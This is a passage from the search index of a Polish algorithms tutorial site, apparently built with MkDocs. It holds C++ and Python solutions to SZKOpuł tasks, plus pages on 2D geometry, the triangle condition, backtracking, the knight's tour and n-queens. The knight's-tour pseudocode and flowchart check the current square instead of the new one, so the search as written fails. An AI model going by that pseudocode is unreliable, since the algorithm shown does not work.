0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/","title":"SZKOpu\u0142","text":"<p>Tutaj znajduj\u0105 si\u0119 rozwi\u0105zania wybranych zada\u0144 z serwisu SZKOpu\u0142</p>"},{"location":"algorithmic-exercises/szkopul/10-wspanialych/","title":"10 Wspania\u0142ych","text":""},{"location":"algorithmic-exercises/szkopul/10-wspanialych/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>10 Wspania\u0142ych</p>"},{"location":"algorithmic-exercises/szkopul/10-wspanialych/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/10-wspanialych/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    int liczba_kandydatow;\n\n    scanf(\"%d\", &amp;liczba_kandydatow);\n\n    int moce_kandydatow[liczba_kandydatow];\n\n    for(int i = 0; i &lt; liczba_kandydatow; i++) {\n        scanf(\"%d\", &amp;moce_kandydatow[i]);\n    }\n\n    sort(moce_kandydatow, moce_kandydatow + liczba_kandydatow);\n\n    for(int i = liczba_kandydatow - 1; i &gt;= liczba_kandydatow - 10 &amp;&amp; i &gt;= 0; i--) {\n        printf(\"%d \", moce_kandydatow[i]);\n    }\n\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/210/","title":"210","text":""},{"location":"algorithmic-exercises/szkopul/210/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>210</p>"},{"location":"algorithmic-exercises/szkopul/210/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/210/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    unsigned long long int n, sum;\n    int digit;\n    string binary;\n\n    scanf(\"%llu\", &amp;n);\n\n    sum = 0;\n\n    while (n &gt; 0) {\n        digit = n % 2;\n        binary = char(digit + '0') + binary;\n        sum += digit;\n        n /= 2;\n    }\n\n    if (binary.length() == 0) {\n        binary = \"0\";\n    }\n\n    printf(\"%s \", binary.c_str());\n\n    binary = \"\";\n\n    while (sum &gt; 0) {\n        digit = sum % 2;\n        binary = char(digit + '0') + binary;\n        sum /= 2;\n    }\n\n    if (binary.length() == 0) {\n        binary = \"0\";\n    }\n\n    printf(\"%s\\n\", binary.c_str());\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/210/python/","title":"Python","text":""},{"location":"algorithmic-exercises/szkopul/210/python/#implementacja","title":"Implementacja","text":"<pre><code>n = int(input())\n\nbinary = format(n, \"b\")\n\ndigits = list(map(int, list(binary)))\n\ndigits_sum = sum(digits)\n\nbinary_sum = format(digits_sum, \"b\")\n\nprint(binary, binary_sum)\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/akcje/","title":"Akcje","text":""},{"location":"algorithmic-exercises/szkopul/akcje/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Akcje</p>"},{"location":"algorithmic-exercises/szkopul/akcje/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/akcje/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, result = 0;\n\n    scanf(\"%d\", &amp;n);\n\n    int tab[n], tabMin[n], tabMax[n];\n\n    for(int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;tab[i]);\n    }\n\n    tabMin[0] = tab[0];\n    tabMax[n - 1] = tab[n - 1];\n\n    for(int i = 1; i &lt; n; i++) {\n        tabMin[i] = min(tab[i], tabMin[i - 1]);\n    }\n\n    for(int i = n - 2; i &gt;= 0; i--) {\n        tabMax[i] = max(tab[i], tabMax[i + 1]);\n    }\n\n    for(int i = 0; i &lt; n - 1; i++) {\n        result = max(tabMax[i + 1] - tabMin[i], result);\n    }\n\n    printf(\"%d\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/anagramy/","title":"Anagramy","text":""},{"location":"algorithmic-exercises/szkopul/anagramy/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Anagramy</p>"},{"location":"algorithmic-exercises/szkopul/anagramy/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/anagramy/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nint main() {\n    string a, b;\n\n    cin &gt;&gt; a &gt;&gt; b;\n\n    sort(a.begin(), a.end());\n    sort(b.begin(), b.end());\n\n    if (a == b) {\n        cout &lt;&lt; \"TAK\" &lt;&lt; endl;\n    } else {\n        cout &lt;&lt; \"NIE\" &lt;&lt; endl;\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/astronom-janusz/","title":"Astronom Janusz","text":""},{"location":"algorithmic-exercises/szkopul/astronom-janusz/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Astronom Janusz</p>"},{"location":"algorithmic-exercises/szkopul/astronom-janusz/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/astronom-janusz/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    int n;\n\n    scanf(\"%d\", &amp;n);\n\n    int tab[n];\n\n    for (int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;tab[i]);\n    }\n\n    if (tab[n - 1] == 0 || (n &gt; 1 &amp;&amp; tab[n-1] &gt; tab[n-2] &amp;&amp; tab[n-1] != 15)) {\n        printf(\"UP\\n\");\n    } else if (tab[n - 1] == 15 || (n &gt; 1 &amp;&amp; tab[n-1] &lt; tab[n-2])) {\n        printf(\"DOWN\\n\");\n    } else {\n        printf(\"UNKNOWN\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/awantura-o-czapki/","title":"Awantura o czapki","text":""},{"location":"algorithmic-exercises/szkopul/awantura-o-czapki/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Awantura o czapki</p>"},{"location":"algorithmic-exercises/szkopul/awantura-o-czapki/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/awantura-o-czapki/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n\nint main() {\n    int a, b;\n\n    scanf(\"%d %d\", &amp;a, &amp;b);\n\n    printf(\"%d\\n\", a + b - 1);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/gra/","title":"Gra","text":""},{"location":"algorithmic-exercises/szkopul/gra/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Gra</p>"},{"location":"algorithmic-exercises/szkopul/gra/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/gra/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdio&gt;\n\nusing namespace std;\n\nint main() {\n    int n, mx;\n\n    scanf(\"%d\", &amp;n);\n\n    int values[n + 1];\n    values[0] = 0;\n\n    for(int i = 1; i &lt;= n; i++) {\n        scanf(\"%d\", &amp;values[i]);\n        mx = values[i] + values[i - 1];\n        for(int j = 2; j &lt;= 6 &amp;&amp; i - j &gt;= 1; j++) {\n            mx = max(mx, values[i] + values[i - j]);\n        }\n\n        values[i] = mx;\n    }\n\n    printf(\"%d\\n\", values[n]);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/kamyki/","title":"Kamyki","text":""},{"location":"algorithmic-exercises/szkopul/kamyki/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Kamyki</p>"},{"location":"algorithmic-exercises/szkopul/kamyki/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/kamyki/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n\nint main() {\n    int t, n, counter;\n\n    scanf(\"%d\", &amp;t);\n\n    for(int testCase = 0; testCase &lt; t; testCase++) {\n        scanf(\"%d\", &amp;n);\n\n        counter = 0;\n\n        while (n % 2 == 0) {\n            n /= 2;\n            counter++;\n        }\n\n        if (counter % 2 == 0) {\n            printf(\"NIE\\n\");\n        } else {\n            printf(\"TAK\\n\");\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/pikieta/","title":"Pikieta","text":""},{"location":"algorithmic-exercises/szkopul/pikieta/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Pikieta</p>"},{"location":"algorithmic-exercises/szkopul/pikieta/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/pikieta/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint main() {\n    int n, number, div;\n\n    unsigned long long int allFactors[50005] = {};\n    unsigned long long int counter, result;\n\n    scanf(\"%d\", &amp;n);\n\n    for(int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;number);\n\n        div = 2;\n\n        while(number &gt; 1) {\n            counter = 0;\n            while(number % div == 0) {\n                counter++;\n                number /= div;\n            }\n\n            if(allFactors[div] &lt; counter) {\n                allFactors[div] = 0;\n            } else {\n                allFactors[div] -= counter;\n            }\n\n            allFactors[div] += counter;\n\n            div++;\n        }\n    }\n\n    result = 1;\n\n    for (int i = 0; i &lt;= 50000; i++) {\n        result *= (allFactors[i] + 1);\n        result %= 12345678;\n    }\n\n    if(result &lt; n) {\n        result += 12345678;\n    }\n\n    result -= n;\n\n    printf(\"%llu\\n\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithmic-exercises/szkopul/tarasy/","title":"Tarasy","text":""},{"location":"algorithmic-exercises/szkopul/tarasy/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Tarasy</p>"},{"location":"algorithmic-exercises/szkopul/tarasy/c%2B%2B/","title":"C++","text":""},{"location":"algorithmic-exercises/szkopul/tarasy/c%2B%2B/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;cstdio&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\n\nint compute(int n, int k, int c[]) {\n    int left = 0, right = 0, current_cost = 0, mx = 0;\n    while(right &lt; n) {\n        if(current_cost + c[right] &lt;= k) {\n            current_cost += c[right];\n            right++;\n        } else {\n            current_cost -= c[left];\n            left++;\n        }\n\n        if(right &lt; left) {\n            right = left;\n            current_cost = 0;\n        }\n\n        if(right - left + 1 &gt; mx) {\n            mx = right - left + 1;\n        }\n    }\n\n    return mx;\n}\n\nint main() {\n    int n, k, result;\n\n    scanf(\"%d %d\", &amp;n, &amp;k);\n\n    int h[n], h_r[n];\n    int c[n - 1], c_r[n - 1];\n\n    for (int i = 0; i &lt; n; i++) {\n        scanf(\"%d\", &amp;h[i]);\n        h_r[n - i - 1] = h[i];\n    }\n\n    for(int i = 1; i &lt; n; i++) {\n        if(h[i] &lt; h[i - 1]) {\n            c[i - 1] = 0;\n        } else {\n            c[i - 1] = h[i] - h[i - 1];\n        }\n\n        if(h_r[i] &lt; h_r[i - 1]) {\n            c_r[i - 1] = 0;\n        } else {\n            c_r[i - 1] = h_r[i] - h_r[i - 1];\n        }\n    }\n\n    result = compute(n - 1, k, c);\n    result = max(result, compute(n - 1, k, c_r));\n\n    printf(\"%d\", result);\n\n    return 0;\n}\n</code></pre>"},{"location":"algorithms/2d-geometry/","title":"Geometria 2D","text":"<p>Geometria obliczeniowa (czasem nazywana geometri\u0105 algorytmiczn\u0105) zajmuje si\u0119 rozwi\u0105zaniem problem\u00f3w matematycznych i obliczeniowych zwi\u0105zanych z obiektami geometrycznymi. Chocia\u017c geometria obliczeniowa obejmuje r\u00f3\u017cne wymiary, algorytmy geometrii 2D dotycz\u0105 przede wszystkim p\u0142askich obiekt\u00f3w, takich jak punkty, linie, wielok\u0105ty, okr\u0119gi i krzywe.</p>"},{"location":"algorithms/2d-geometry/#podstawowe-pojecia","title":"Podstawowe poj\u0119cia","text":"<ul> <li>Punkt: Najbardziej podstawowy obiekt w geometrii 2D. Charakteryzuje si\u0119 dwoma wsp\u00f3\u0142rz\u0119dnymi: \\((x, y)\\).</li> <li>Odcinek: Po\u0142\u0105czenie dw\u00f3ch punkt\u00f3w lini\u0105.</li> <li>Wielok\u0105t: Zamkni\u0119ta figura utworzona przez trzy lub wi\u0119cej odcink\u00f3w.</li> <li>Okr\u0105g: Wszystkie punkty w r\u00f3wnym oddaleniu od jednego centralnego punktu.</li> </ul>"},{"location":"algorithms/2d-geometry/#kluczowe-problemy","title":"Kluczowe problemy","text":"<ul> <li>Lokalizacja punktu: Okre\u015blenie, czy punkt znajduje si\u0119 wewn\u0105trz, na zewn\u0105trz czy na obrze\u017cu danego wielok\u0105ta.</li> <li>Przeci\u0119cie odcink\u00f3w: Okre\u015blenie, czy dwa odcinki przecinaj\u0105 si\u0119.</li> <li>Otoczka wypuk\u0142a: Znalezienie najmniejszego wielok\u0105ta wypuk\u0142ego zawieraj\u0105cego dany zestaw punkt\u00f3w.</li> <li>Najbli\u017csza para punkt\u00f3w: Znalezienie dw\u00f3ch najbli\u017cej le\u017c\u0105cych do siebie punkt\u00f3w w zestawie.</li> </ul>"},{"location":"algorithms/2d-geometry/#algorytmy-i-techniki","title":"Algorytmy i techniki","text":"<ul> <li>Skanowanie Grahama: Algorytm do znajdowania otoczki wypuk\u0142ej dla zestawu punkt\u00f3w.</li> <li>Sweep Line: Technika u\u017cywana w wielu problemach geometrii 2D, takich jak wyszukiwanie przeci\u0119\u0107 odcink\u00f3w.</li> <li>Dziel i zwyci\u0119\u017caj: Podstawowa metoda u\u017cywana do rozwi\u0105zywania problemu najbli\u017cszej pary punkt\u00f3w.</li> </ul>"},{"location":"algorithms/2d-geometry/#zastosowania","title":"Zastosowania","text":"<p>Algorytmy geometrii 2D maj\u0105 szerokie zastosowanie w r\u00f3\u017cnych dziedzinach, od grafiki komputerowej, poprzez robotyk\u0119, po analiz\u0119 geospacyjn\u0105. Umo\u017cliwiaj\u0105 one tworzenie realistycznych symulacji, optymalizacj\u0119 tras robot\u00f3w czy te\u017c analiz\u0119 przestrzenn\u0105 w GIS.</p>"},{"location":"algorithms/2d-geometry/#podsumowanie","title":"Podsumowanie","text":"<p>Znajomo\u015b\u0107 podstawowych algorytm\u00f3w geometrii 2D jest kluczowa dla ka\u017cdego, kto zajmuje si\u0119 grafik\u0105 komputerow\u0105, analiz\u0105 geospacyjn\u0105 czy robotyk\u0105. Pomimo \u017ce s\u0105 to problemy p\u0142askie, potrafi\u0105 one by\u0107 zaskakuj\u0105co skomplikowane. Jednak odpowiednio dobrany algorytm potrafi uczyni\u0107 trudny problem \u0142atwo rozwi\u0105zywalnym.</p>"},{"location":"algorithms/2d-geometry/point-line-distance/","title":"Odleg\u0142o\u015b\u0107 punktu od prostej","text":""},{"location":"algorithms/2d-geometry/point-line-distance/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/2d-geometry/point-line-distance/#c","title":"C++","text":""},{"location":"algorithms/2d-geometry/point-line-distance/#python","title":"Python","text":""},{"location":"algorithms/2d-geometry/point-on-segment/","title":"Punkt na odcinku","text":""},{"location":"algorithms/2d-geometry/point-on-segment/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/2d-geometry/point-on-segment/#c","title":"C++","text":""},{"location":"algorithms/2d-geometry/point-on-segment/#python","title":"Python","text":""},{"location":"algorithms/2d-geometry/segments-crossing/","title":"Przecinanie si\u0119 odcink\u00f3w","text":""},{"location":"algorithms/2d-geometry/segments-crossing/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/2d-geometry/segments-crossing/#c","title":"C++","text":""},{"location":"algorithms/2d-geometry/segments-crossing/#python","title":"Python","text":""},{"location":"algorithms/2d-geometry/triangle-condition/","title":"Warunek tr\u00f3jk\u0105ta","text":"<p>Tr\u00f3jk\u0105t jest jedn\u0105 z podstawowych figur geometrycznych. Jak jednak go zbudowa\u0107? Po pierwsze: potrzebujemy trzech odcink\u00f3w. Nie mog\u0105 to jednak by\u0107 dowolne odcinki! Musz\u0105 one spe\u0142nia\u0107 tzw. warunek tr\u00f3jk\u0105ta.</p>"},{"location":"algorithms/2d-geometry/triangle-condition/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/2d-geometry/triangle-condition/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - liczby naturalne, d\u0142ugo\u015bci odcink\u00f3w, \\(a&gt;0\\), \\(b&gt;0\\), \\(c&gt;0\\).</li> </ul>"},{"location":"algorithms/2d-geometry/triangle-condition/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA je\u017celi z podanych odcink\u00f3w mo\u017cna zbudowa\u0107 tr\u00f3jk\u0105t,</li> <li>FA\u0141SZ w przeciwnym przypadku.</li> </ul>"},{"location":"algorithms/2d-geometry/triangle-condition/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Aby z trzech odcink\u00f3w mo\u017cna by\u0142o zbudowa\u0107 tr\u00f3jk\u0105t, musi by\u0107 spe\u0142niony nast\u0119puj\u0105cy warunek: d\u0142ugo\u015b\u0107 ka\u017cdego odcinka jest mniejsza od sumy dw\u00f3ch pozosta\u0142ych. Z tego wynika, \u017ce mamy do sprawdzenia trzy nier\u00f3wno\u015bci.</p> <p>Alternatywnie mo\u017cna tak\u017ce sprawdzi\u0107, czy suma dw\u00f3ch mniejszych odcink\u00f3w jest wi\u0119ksza od d\u0142ugo\u015bci trzeciego, najd\u0142u\u017cszego odcinka.</p>"},{"location":"algorithms/2d-geometry/triangle-condition/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja WarunekTr\u00f3jk\u0105ta(a, b, c):\n    1. Je\u017celi a &lt; b + c oraz b &lt; a + c oraz c &lt; a + b, to:\n        2. Zwr\u00f3\u0107 PRAWDA\n    3. w przeciwnym przypadku:\n        4. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"algorithms/2d-geometry/triangle-condition/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"WarunekTr\u00f3jk\u0105ta(a, b, c)\"]) --&gt; K1{\"a &lt; b + c\n    oraz\n    b &lt; a + c\n    oraz\n    c &lt; a + b\"}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 PRAWDA/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K4[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/2d-geometry/triangle-condition/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/2d-geometry/triangle-condition/#c","title":"C++","text":""},{"location":"algorithms/2d-geometry/triangle-condition/#python","title":"Python","text":""},{"location":"algorithms/backtracking/","title":"Przeszukiwanie z powrotami","text":"<p>Przeszukiwanie z powrotami (ang. backtracking) to fundamentalne podej\u015bcie w dziedzinie informatyki s\u0142u\u017c\u0105ce do rozwi\u0105zywania problem\u00f3w poprzez pr\u00f3bowanie i cofanie. Ide\u0105 jest wypr\u00f3bowanie wszystkich mo\u017cliwych rozwi\u0105za\u0144 problemu do momentu znalezienia odpowiedniego rozwi\u0105zania.</p> <p>W algorytmach przeszukiwania z powrotami mo\u017cemy wyr\u00f3\u017cni\u0107 nast\u0119puj\u0105ce cechy:</p> <ul> <li>Rekursja: Najwa\u017cniejszym aspektem algorytm\u00f3w backtracking jest rekursja. Algorytmy te zazwyczaj opieraj\u0105 si\u0119 na rekursji do testowania wszystkich mo\u017cliwych rozwi\u0105za\u0144.</li> <li>Wyb\u00f3r i cofanie: W podej\u015bciu tym algorytm podejmuje decyzj\u0119 (wyb\u00f3r), a nast\u0119pnie kontynuuje przeszukiwanie do momentu, a\u017c napotka przeszkod\u0119. W tym momencie algorytm cofa si\u0119 do poprzedniego stanu i pr\u00f3buje innego rozwi\u0105zania.</li> <li>Przycinanie (ang. pruning): Nie wszystkie \u015bcie\u017cki w drzewie przeszukiwa\u0144 musz\u0105 by\u0107 eksplorowane. Znaj\u0105c pewne cechy problemu, mo\u017cna przycina\u0107 niekt\u00f3re \u015bcie\u017cki, kt\u00f3re na pewno nie doprowadz\u0105 do rozwi\u0105zania.</li> </ul>"},{"location":"algorithms/backtracking/#zastosowania","title":"Zastosowania","text":"<p>Algorytmy przeszukiwania z powrotami maj\u0105 szerokie zastosowanie, mi\u0119dzy innymi w:</p> <ul> <li>Rozwi\u0105zywaniu \u0142amig\u0142\u00f3wek, takich jak sudoku.</li> <li>Problemach optymalizacyjnych, takich jak problem komiwoja\u017cera.</li> <li>Problemach decyzyjnych, takich jak problem kolorowania grafu.</li> <li>Problemach kombinatorycznych, takich jak generowanie wszystkich mo\u017cliwych permutacji element\u00f3w.</li> </ul>"},{"location":"algorithms/backtracking/#podsumowanie","title":"Podsumowanie","text":"<p>Backtracking jest pot\u0119\u017cnym narz\u0119dziem do rozwi\u0105zywania problem\u00f3w, kt\u00f3re wydaj\u0105 si\u0119 by\u0107 zbyt skomplikowane do rozwi\u0105zania w spos\u00f3b bezpo\u015bredni. Pomimo, \u017ce algorytmy te mog\u0105 by\u0107 czasoch\u0142onne (zw\u0142aszcza dla du\u017cych zestaw\u00f3w danych), ich zdolno\u015b\u0107 do eksplorowania wszystkich mo\u017cliwych rozwi\u0105za\u0144 i dynamicznego dostosowywania si\u0119 do problem\u00f3w czyni je niezwykle u\u017cytecznymi w wielu sytuacjach. Jednak kluczem do skutecznego wykorzystania backtrackingu jest umiej\u0119tno\u015b\u0107 rozpoznawania moment\u00f3w, w kt\u00f3rych mo\u017cna przyci\u0105\u0107 przeszukiwanie, aby zaoszcz\u0119dzi\u0107 czas i moc obliczeniow\u0105.</p>"},{"location":"algorithms/backtracking/knights-tour/","title":"Problem skoczka","text":"<p>Skoczek, zwany inaczej koniem, to figura szachowa kt\u00f3ra wykonuje ruchy w kszta\u0142cie litery L, tzn. mo\u017ce przemie\u015bci\u0107 si\u0119 o dwa pola w pionie i jedno w poziomie, lub o dwa pola w poziomie i jedno w pionie. Problem zwi\u0105zany z t\u0105 figur\u0105 jest nast\u0119puj\u0105cy: czy zaczynaj\u0105c z lewego dolnego pola szachownicy skoczek jest w stanie odwiedzi\u0107 wszystkie pola dok\u0142adnie raz?</p>"},{"location":"algorithms/backtracking/knights-tour/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/backtracking/knights-tour/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, wymiary szachownicy, liczba wierszy i kolumn, \\(n&gt;0\\).</li> </ul>"},{"location":"algorithms/backtracking/knights-tour/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA je\u017celi skoczek mo\u017ce odwiedzi\u0107 wszystkie pola szachownicy \\(n\\times n\\) dok\u0142adnie raz,</li> <li>FA\u0141SZ w przeciwnym przypadku.</li> </ul>"},{"location":"algorithms/backtracking/knights-tour/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Idea rozwi\u0105zania jest stosunkowo prosta. B\u0119dziemy rekurencyjnie sprawdza\u0107 wszystkie mo\u017cliwe ruchy skoczka. Gdy dojdziemy do miejsca, z kt\u00f3rego nie b\u0119dziemy mogli ju\u017c wykona\u0107 kolejnego ruchu, to cofniemy si\u0119 do poprzedniego pola.</p>"},{"location":"algorithms/backtracking/knights-tour/#przykad","title":"Przyk\u0142ad","text":"<p>Ruch 1</p> a b c d 4 3 2 1 K <p>Ruch 2</p> a b c d 4 3 2 K 1 X <p>Ruch 3</p> a b c d 4 K 3 2 X 1 X <p>Ruch 4</p> a b c d 4 X 3 K 2 X 1 X <p>Ruch 5</p> a b c d 4 X 3 X 2 X 1 X K <p>Ruch 6</p> a b c d 4 X 3 X 2 K X 1 X X <p>Ruch 7</p> a b c d 4 K X 3 X 2 X X 1 X X <p>Ruch 8</p> a b c d 4 X X 3 X K 2 X X 1 X X <p>Ruch 9</p> a b c d 4 X X 3 X X 2 X K X 1 X X <p>Ruch 10</p> a b c d 4 X X 3 X X 2 X K X 1 X X X <p>Ruch 11</p> a b c d 4 X K X 3 X X 2 X X X 1 X X X <p>Ruch 12</p> a b c d 4 X X X 3 X X 2 X X X K 1 X X X <p>Ruch 13</p> a b c d 4 X X X 3 X X 2 X X X X 1 X K X X <p>Ruch 14</p> a b c d 4 X X X 3 K X X 2 X X X X 1 X X X X <p>W tym momencie nie mo\u017cemy ju\u017c wykona\u0107 kolejnego ruchu. Cofamy si\u0119 wi\u0119c do poprzedniej sytuacji z ruchu 13. </p> a b c d 4 X X X 3 X X 2 X X X X 1 X K X X <p>Tutaj mamy jeszcze jedn\u0105 mo\u017cliwo\u015b\u0107 ruchu, kt\u00f3rej wcze\u015bniej nie sprawdzili\u015bmy. Mo\u017cemy poruszy\u0107 si\u0119 na pole c3. Wykonujemy wi\u0119c nowy ruch 14.</p> <p>Ruch 14</p> a b c d 4 X X X 3 X K X 2 X X X X 1 X X X X <p>Ruch 15</p> a b c d 4 K X X X 3 X X X 2 X X X X 1 X X X X <p>Teraz tak\u017ce jeste\u015bmy w sytuacji bez wyj\u015bcia. W tym momencie algorytm ponownie wycofa\u0142by si\u0119 do ostatniej pozycji, w kt\u00f3rym mieli\u015bmy jeszcze niezbadany ruch. Tego jednak nie b\u0119dziemy ju\u017c prezentowa\u0107, pozostawiamy jako samodzielne \u0107wiczenie.</p>"},{"location":"algorithms/backtracking/knights-tour/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja ProblemSkoczka(n, szachownica, odwiedzone, wiersz, kolumna):\n    1. Je\u017celi odwiedzone = n * n, to:\n        2. Zwr\u00f3\u0107 PRAWDA\n    3. szachownica[wiersz][kolumna] := PRAWDA\n    4. ruchyWiersz[1..8] := {-1, 1, 2, 2, -2, -2, -1, 1}\n    5. ruchyKolumna[1..8] := {-2, -2, -1, 1, -1, 1, 2, 2}\n    6. Dla i := 1 do 8, wykonuj:\n        7. nowyWiersz := wiersz + ruchyWiersz[i]\n        8. nowaKolumna := kolumna + ruchyKolumna[i]\n        9. Je\u017celi nowyWiersz &lt;= n oraz nowyWiersz &gt;= 1 oraz nowaKolumna &lt;= n oraz nowaKolumna &gt;= 1 oraz szachownica[wiersz][kolumna] = FA\u0141SZ, to:\n            10. Je\u017celi ProblemSkoczka(n, szachownica, odwiedzone + 1, nowyWiersz, nowaKolumna), to:\n                11. Zwr\u00f3\u0107 PRAWDA\n    12. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre>"},{"location":"algorithms/backtracking/knights-tour/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"ProblemSkoczka(n, szachownica, odwiedzone, wiersz, kolumna)\"]) --&gt; K1{odwiedzone = n * n}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 PRAWDA/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3[\"szachownica[wiersz][kolumna] := PRAWDA\n    ruchyWiersz[1..8] := {-1, 1, 2, 2, -2, -2, -1, 1}\n    ruchyKolumna[1..8] := {-2, -2, -1, 1, -1, 1, 2, 2}\n    i := 1\"]\n    K3 --&gt; K6{i &lt;= 8}\n    K6 -- PRAWDA --&gt; K7[\"nowyWiersz := wiersz + ruchyWiersz[i]\n    nowaKolumna := kolumna + ruchyKolumna[i]\"]\n    K7 --&gt; K9{\"nowyWiersz &lt;= n\n    oraz\n    nowyWiersz &gt;= 1\n    oraz\n    nowaKolumna &lt;= n\n    oraz\n    nowaKolumna &gt;= 1\n    oraz\n    szachownica[wiersz][kolumna] = FA\u0141SZ\"}\n    K9 -- PRAWDA --&gt; K10{\"ProblemSkoczka(n, \n    szachownica, \n    odwiedzone + 1, \n    nowyWiersz, \n    nowaKolumna)\"}\n    K10 -- PRAWDA --&gt; K11[/Zwr\u00f3\u0107 PRAWDA/]\n    K11 --&gt; STOP\n    K10 -- FA\u0141SZ --&gt; K6i[i := i + 1]\n    K9 -- FA\u0141SZ --&gt; K6i\n    K6i --&gt; K6\n    K6 -- FA\u0141SZ --&gt; K12[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K12 --&gt; STOP</code></pre>"},{"location":"algorithms/backtracking/knights-tour/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/backtracking/knights-tour/#c","title":"C++","text":""},{"location":"algorithms/backtracking/knights-tour/#python","title":"Python","text":""},{"location":"algorithms/backtracking/n-queens/","title":"Problem n kr\u00f3lowych","text":"<p>Problem \\(n\\) kr\u00f3lowych to jeden z klasycznych problem\u00f3w algorytmicznych zwi\u0105zanych z szachami. Problem brzmi nast\u0119puj\u0105co: maj\u0105c szachownic\u0119 \\(n\\times n\\) oraz \\(n\\) kr\u00f3lowych, czy mo\u017cna ustawi\u0107 wszystkie kr\u00f3lowe na szchownicy, tak by \u017cadne dwie si\u0119 wzajemnie nie atakowa\u0142y?</p> <p>Zaczniemy od przytoczenia tanecznego przeszukiwania, kt\u00f3re demonstruje dzia\u0142anie algorytmu dla szachownicy \\(4\\times 4\\) oraz \\(4\\) kr\u00f3lowych. Nast\u0119pnie przejdziemy do formalnej 